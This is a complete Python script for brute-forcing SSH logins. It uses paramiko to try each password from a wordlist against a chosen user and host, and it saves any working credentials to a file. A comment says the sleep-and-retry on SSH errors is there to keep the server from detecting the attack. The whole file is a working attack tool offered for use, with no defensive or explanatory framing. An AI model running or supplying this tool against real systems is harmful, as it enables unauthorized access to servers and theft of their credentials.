# Python Script for SSH Brute Force

# Importing Modules
import paramiko, socket, time, argparse
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def sshbrute(hostname, username, password):
    # Initializing SSH Client
    client = paramiko.SSHClient()

    # Adding to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # Do when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        # Do when username and password combination is incorrect
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        # Prevent server from detecting the brute force
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # Sleep for a minute
        time.sleep(60)
        return sshbrute(hostname, username, password)
    else:
        # Connection has been established
        print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python Script")
    parser.add_argument("host", help="Hostname or IP Address of Server to brute force")
    parser.add_argument("-P", "--passlist", help="Password list text file")
    parser.add_argument("-u", "--user", help="Host username")

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # Read the file
    passlist = open(passlist).read().splitlines()

    # Start the brute force
    for password in passlist:
        if sshbrute(host, user, password):
            # Save valid combination to a file
            open("Credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
